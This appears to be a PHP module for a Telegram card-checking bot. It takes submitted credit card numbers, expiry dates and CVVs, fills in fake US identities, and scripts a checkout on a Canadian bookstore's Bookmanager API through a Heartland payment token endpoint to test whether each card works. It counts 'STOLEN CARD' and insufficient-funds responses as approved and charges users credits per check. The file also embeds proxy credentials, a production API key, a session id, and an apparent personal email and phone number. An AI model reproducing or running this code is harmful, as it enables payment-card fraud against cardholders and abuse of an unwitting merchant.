<?php


$gatewayname="ho";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#heartlandportico_CCN (".'$ho'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($ano) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];

$cardLast4 = substr($cc, -4);
$cardBin = substr($cc, 0, 6);


    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    

 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    $lastFourDigits = substr($cc, -4);

 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
$socks5 = "gw.dataimpulse.com:823";
$rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";
 
 $cookie = uniqid();
 
 
 $proxies = null;

 //==================[Curl Request]======================//
 $response = CurlX::Post(
    "https://api.bookmanager.com/customer/cart/add",
    '------WebKitFormBoundarywhYCGEigDbYYUoHC
Content-Disposition: form-data; name="uuid"

'.$bot->generateUUID().'
------WebKitFormBoundarywhYCGEigDbYYUoHC
Content-Disposition: form-data; name="session_id"

CMRk7NkO0ugd3IoR_DrxOf2qIsMd
------WebKitFormBoundarywhYCGEigDbYYUoHC
Content-Disposition: form-data; name="log_url"

/item/15UxKxt0oIBkEw3rPrJyqA
------WebKitFormBoundarywhYCGEigDbYYUoHC
Content-Disposition: form-data; name="store_id"

93043
------WebKitFormBoundarywhYCGEigDbYYUoHC
Content-Disposition: form-data; name="eisbn"

15UxKxt0oIBkEw3rPrJyqA
------WebKitFormBoundarywhYCGEigDbYYUoHC
Content-Disposition: form-data; name="condition"


------WebKitFormBoundarywhYCGEigDbYYUoHC
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundarywhYCGEigDbYYUoHC--
',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywhYCGEigDbYYUoHC',
        'Origin: https://bookmarkreads.ca',
        'Referer: https://bookmarkreads.ca/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Post(
    "https://api.bookmanager.com/customer/checkout/setDelivery",
    '------WebKitFormBoundaryLAYjxdKDumnvToLH
Content-Disposition: form-data; name="uuid"

'.$bot->generateUUID().'
------WebKitFormBoundaryLAYjxdKDumnvToLH
Content-Disposition: form-data; name="session_id"

CMRk7NkO0ugd3IoR_DrxOf2qIsMd
------WebKitFormBoundaryLAYjxdKDumnvToLH
Content-Disposition: form-data; name="log_url"

/checkout/cart
------WebKitFormBoundaryLAYjxdKDumnvToLH
Content-Disposition: form-data; name="store_id"

93043
------WebKitFormBoundaryLAYjxdKDumnvToLH
Content-Disposition: form-data; name="delivery_preference"

pickup
------WebKitFormBoundaryLAYjxdKDumnvToLH
Content-Disposition: form-data; name="custom"

false
------WebKitFormBoundaryLAYjxdKDumnvToLH--',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLAYjxdKDumnvToLH',
        'Origin: https://bookmarkreads.ca',
        'Referer: https://bookmarkreads.ca/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Post(
    "https://api.bookmanager.com/customer/checkout/setExtras",
    '------WebKitFormBoundaryYjLWIaBhxhI2YO3B
Content-Disposition: form-data; name="uuid"

'.$bot->generateUUID().'
------WebKitFormBoundaryYjLWIaBhxhI2YO3B
Content-Disposition: form-data; name="session_id"

CMRk7NkO0ugd3IoR_DrxOf2qIsMd
------WebKitFormBoundaryYjLWIaBhxhI2YO3B
Content-Disposition: form-data; name="log_url"

/checkout/contact
------WebKitFormBoundaryYjLWIaBhxhI2YO3B
Content-Disposition: form-data; name="store_id"

93043
------WebKitFormBoundaryYjLWIaBhxhI2YO3B
Content-Disposition: form-data; name="name"

Jose
------WebKitFormBoundaryYjLWIaBhxhI2YO3B
Content-Disposition: form-data; name="email"

frangelotorrez1@gmail.com
------WebKitFormBoundaryYjLWIaBhxhI2YO3B
Content-Disposition: form-data; name="phone"

2144029602
------WebKitFormBoundaryYjLWIaBhxhI2YO3B
Content-Disposition: form-data; name="promo_code"


------WebKitFormBoundaryYjLWIaBhxhI2YO3B
Content-Disposition: form-data; name="instructions"


------WebKitFormBoundaryYjLWIaBhxhI2YO3B
Content-Disposition: form-data; name="preferred_communication"

email
------WebKitFormBoundaryYjLWIaBhxhI2YO3B--',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYjLWIaBhxhI2YO3B',
        'Origin: https://bookmarkreads.ca',
        'Referer: https://bookmarkreads.ca/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Post(
    "https://api.bookmanager.com/customer/checkout/setPaymentChoice",
    '------WebKitFormBoundaryAA0lYAiFYx68L1NQ
Content-Disposition: form-data; name="uuid"

'.$bot->generateUUID().'
------WebKitFormBoundaryAA0lYAiFYx68L1NQ
Content-Disposition: form-data; name="session_id"

CMRk7NkO0ugd3IoR_DrxOf2qIsMd
------WebKitFormBoundaryAA0lYAiFYx68L1NQ
Content-Disposition: form-data; name="log_url"

/checkout/payment
------WebKitFormBoundaryAA0lYAiFYx68L1NQ
Content-Disposition: form-data; name="store_id"

93043
------WebKitFormBoundaryAA0lYAiFYx68L1NQ
Content-Disposition: form-data; name="payment_choice"

global
------WebKitFormBoundaryAA0lYAiFYx68L1NQ--',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAA0lYAiFYx68L1NQ',
        'Origin: https://bookmarkreads.ca',
        'Referer: https://bookmarkreads.ca/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);



$response = CurlX::Post(
    "https://api.heartlandportico.com/SecureSubmit.v1/api/token?api_key=pkapi_prod_5P17CLgywLPjmBgKGI&",
    '{"object":"token","token_type":"supt","card":{"number":"'.$cc.'","cvc":"","exp_month":"'.$mes.'","exp_year":"'.$ano.'"}}',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Origin: https://js.globalpay.com',
        'Referer: https://js.globalpay.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'content-type: application/json'
    ],
    $cookie,
    $proxies
);
$token = CurlX::ParseString($response->body,'"token_value": "','"');


$response = CurlX::Post(
    "https://api.bookmanager.com/customer/checkout/cardPayment",
    '------WebKitFormBoundary2fz7m9cEBLyAQVYU
Content-Disposition: form-data; name="uuid"

'.$bot->generateUUID().'
------WebKitFormBoundary2fz7m9cEBLyAQVYU
Content-Disposition: form-data; name="session_id"

CMRk7NkO0ugd3IoR_DrxOf2qIsMd
------WebKitFormBoundary2fz7m9cEBLyAQVYU
Content-Disposition: form-data; name="log_url"

/checkout/review
------WebKitFormBoundary2fz7m9cEBLyAQVYU
Content-Disposition: form-data; name="store_id"

93043
------WebKitFormBoundary2fz7m9cEBLyAQVYU
Content-Disposition: form-data; name="provider"

global
------WebKitFormBoundary2fz7m9cEBLyAQVYU
Content-Disposition: form-data; name="transaction_data"

{"details":{"cardNumber":"'.$cardBin.'******'.$cardLast4.'","cardBin":"'.$cardBin.'","cardLast4":"'.$cardLast4.'","cardType":"'.$type.'","cardSecurityCode":false,"expiryMonth":"'.$mes.'","expiryYear":"'.$ano.'","cardholderName":"alec torres"},"paymentReference":"'.$token.'"}
------WebKitFormBoundary2fz7m9cEBLyAQVYU
Content-Disposition: form-data; name="postal_code"

100080
------WebKitFormBoundary2fz7m9cEBLyAQVYU--',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2fz7m9cEBLyAQVYU',
        'Origin: https://bookmarkreads.ca',
        'Referer: https://bookmarkreads.ca/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);


 //==================[Manejo de los mensajes]======================//
 $errormessage=CurlX::ParseString($response->body,'{"error":"','"');

if($errormessage=="null"){
    $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
} 


 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 if($errormessage=="Success"){
    $response = $db->deductCredits($userId, 5);

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved", "en", $lang)." CCN✅",
            "$errormessage
Code: $approvalCode AVS: $avsMatch",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);

 }
 elseif($errormessage=="Insufficient Funds"){
    $response = $db->deductCredits($userId, 5);

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage=="ADcln - AVS (S)"){
    $response = $db->deductCredits($userId, 5);

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage=="CVV2 MISMATCH"){
    $response = $db->deductCredits($userId, 5);

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved", "en", $lang)." CCN✅",
            "000 Approved",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)"){
    
    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "ERROR: ((6)) DECLINED: STOLEN CARD Please try again or contact us for assistance."){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
           $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code avs_and_cvv: Gateway Rejected: avs_and_cvv"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code 2010: Card Issuer Declined CVV"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
        $errormessage,
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
